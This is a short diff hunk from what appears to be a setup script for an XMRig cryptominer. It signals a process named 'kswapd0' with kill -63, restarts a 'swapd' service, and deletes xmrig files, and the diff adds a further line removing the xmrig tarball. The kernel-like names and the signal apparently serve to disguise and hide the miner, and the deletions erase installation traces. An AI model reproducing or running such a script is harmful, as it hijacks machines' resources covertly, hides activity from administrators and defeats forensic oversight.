@@ -473,4 +473,6 @@ kill -63 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2
 
 systemctl restart swapd ; rm -rf $HOME/xmrig* ; apt autoremove -y ; yum autoremove -y;
 
+rm -rf xmrig.tar*
+
 echo "[*] Setup complete"
